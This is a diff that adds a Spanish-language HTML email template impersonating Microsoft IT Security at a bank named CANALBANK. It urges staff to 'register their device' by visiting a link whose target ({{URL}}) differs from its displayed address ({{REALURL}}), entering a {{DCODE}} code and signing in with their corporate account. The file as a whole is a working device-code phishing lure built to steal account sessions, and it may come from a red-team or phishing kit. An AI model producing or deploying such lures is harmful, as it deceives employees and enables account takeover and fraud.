@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Registro de Dispositivo Corporativo</title>
+</head>
+<body style="margin:0;padding:0;background-color:#f4f4f4;font-family:'Segoe UI',Arial,sans-serif;">
+  <table width="100%" cellpadding="0" cellspacing="0" style="background-color:#f4f4f4;padding:30px 0;">
+    <tr>
+      <td align="center">
+        <table width="600" cellpadding="0" cellspacing="0" style="background-color:#ffffff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.08);">
+          
+          <!-- HEADER -->
+          <tr>
+            <td style="background-color:#0078d4;padding:28px 40px;">
+              <table width="100%" cellpadding="0" cellspacing="0">
+                <tr>
+                  <td>
+                    <span style="color:#ffffff;font-size:22px;font-weight:700;letter-spacing:0.5px;">Microsoft</span>
+                    <span style="color:#a8d4f5;font-size:22px;font-weight:300;"> | IT Security</span>
+                  </td>
+                  <td align="right">
+                    <span style="color:#ffffff;font-size:12px;opacity:0.8;">CANALBANK</span>
+                  </td>
+                </tr>
+              </table>
+            </td>
+          </tr>
+
+          <!-- BANNER AVISO -->
+          <tr>
+            <td style="background-color:#fff4ce;padding:12px 40px;border-bottom:1px solid #f0e0a0;">
+              <p style="margin:0;font-size:13px;color:#7a5c00;">
+                ⚠️ <strong>Acción requerida:</strong> Debes completar el registro de tu dispositivo para mantener el acceso a los sistemas corporativos.
+              </p>
+            </td>
+          </tr>
+
+          <!-- BODY -->
+          <tr>
+            <td style="padding:36px 40px;">
+              <p style="margin:0 0 10px 0;font-size:15px;color:#333333;">Hola <strong>{{NAME}}</strong>,</p>
+              <p style="margin:0 0 20px 0;font-size:14px;color:#555555;line-height:1.6;">
+                Como parte del programa de <strong>actualización de seguridad y cumplimiento corporativo</strong> de <strong>CANALBANK</strong>, el equipo de IT Security requiere que registres tu dispositivo en el portal de Microsoft para garantizar la instalación correcta de los agentes de seguridad, políticas de acceso condicional y actualizaciones requeridas.
+              </p>
+              <p style="margin:0 0 20px 0;font-size:14px;color:#555555;line-height:1.6;">
+                Este proceso es <strong>obligatorio</strong> para todos los colaboradores y garantiza que tu equipo cumpla con los estándares de seguridad definidos por la organización.
+              </p>
+
+              <!-- PASOS -->
+              <table width="100%" cellpadding="0" cellspacing="0" style="background-color:#f8f9fa;border-radius:6px;border:1px solid #e0e0e0;margin-bottom:24px;">
+                <tr>
+                  <td style="padding:20px 24px;">
+                    <p style="margin:0 0 14px 0;font-size:14px;font-weight:700;color:#0078d4;">Pasos para completar el registro:</p>
+                    <table cellpadding="0" cellspacing="0">
+                      <tr>
+                        <td style="padding:6px 0;vertical-align:top;">
+                          <span style="background:#0078d4;color:#fff;border-radius:50%;width:22px;height:22px;display:inline-block;text-align:center;line-height:22px;font-size:12px;font-weight:700;margin-right:10px;">1</span>
+                        </td>
+                        <td style="padding:6px 0;font-size:13px;color:#444;line-height:1.5;">
+                          Abre un navegador web en tu dispositivo corporativo.
+                        </td>
+                      </tr>
+                      <tr>
+                        <td style="padding:6px 0;vertical-align:top;">
+                          <span style="background:#0078d4;color:#fff;border-radius:50%;width:22px;height:22px;display:inline-block;text-align:center;line-height:22px;font-size:12px;font-weight:700;margin-right:10px;">2</span>
+                        </td>
+                        <td style="padding:6px 0;font-size:13px;color:#444;line-height:1.5;">
+                          Ingresa a: <a href="{{URL}}" style="color:#0078d4;font-weight:600;">{{REALURL}}</a>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td style="padding:6px 0;vertical-align:top;">
+                          <span style="background:#0078d4;color:#fff;border-radius:50%;width:22px;height:22px;display:inline-block;text-align:center;line-height:22px;font-size:12px;font-weight:700;margin-right:10px;">3</span>
+                        </td>
+                        <td style="padding:6px 0;font-size:13px;color:#444;line-height:1.5;">
+                          Ingresa el código de verificación que aparece más abajo cuando se te solicite.
+                        </td>
+                      </tr>
+                      <tr>
+                        <td style="padding:6px 0;vertical-align:top;">
+                          <span style="background:#0078d4;color:#fff;border-radius:50%;width:22px;height:22px;display:inline-block;text-align:center;line-height:22px;font-size:12px;font-weight:700;margin-right:10px;">4</span>
+                        </td>
+                        <td style="padding:6px 0;font-size:13px;color:#444;line-height:1.5;">
+                          Inicia sesión con tu cuenta corporativa <strong>{{EMAIL}}</strong> y sigue las instrucciones en pantalla.
+                        </td>
+                      </tr>
+                    </table>
+                  </td>
+                </tr>
+              </table>
+
+              <!-- CÓDIGO DCODE -->
+              <table width="100%" cellpadding="0" cellspacing="0" style="margin-bottom:24px;">
+                <tr>
+                  <td align="center">
+                    <p style="margin:0 0 10px 0;font-size:13px;color:#777;">Tu código de verificación de dispositivo:</p>
+                    <div style="display:inline-block;background:#0078d4;color:#ffffff;font-size:32px;font-weight:700;letter-spacing:8px;padding:20px 48px;border-radius:8px;">
+                      {{DCODE}}
+                    </div>
+                    <p style="margin:12px 0 0 0;font-size:12px;color:#999;">Este código es de uso único y expira en <strong>15 minutos</strong>.</p>
+                  </td>
+                </tr>
+              </table>
+
+              <!-- NOTA -->
+              <table width="100%" cellpadding="0" cellspacing="0" style="background-color:#e8f4fd;border-left:4px solid #0078d4;border-radius:4px;margin-bottom:20px;">
+                <tr>
+                  <td style="padding:14px 18px;font-size:13px;color:#0078d4;line-height:1.6;">
+                    <strong>ℹ️ Nota:</strong> Si tienes dificultades para completar el registro o no reconoces esta solicitud, comunícate de inmediato con el equipo de IT Security al canal interno de soporte.
+                  </td>
+                </tr>
+              </table>
+
+              <p style="margin:0;font-size:14px;color:#555;">Saludos,<br><strong>IT Security Team</strong><br>CANALBANK</p>
+            </td>
+          </tr>
+
+          <!-- FOOTER -->
+          <tr>
+            <td style="background-color:#f4f4f4;padding:16px 40px;border-top:1px solid #e0e0e0;">
+              <p style="margin:0;font-size:11px;color:#999;text-align:center;line-height:1.6;">
+                Este correo fue enviado por el equipo de IT Security de CANALBANK. Si no solicitaste esta acción, ignora este mensaje o contacta a soporte interno.<br>
+                © 2026 CANALBANK — Uso interno y confidencial.
+              </p>
+            </td>
+          </tr>
+
+        </table>
+      </td>
+    </tr>
+  </table>
+</body>
+</html>
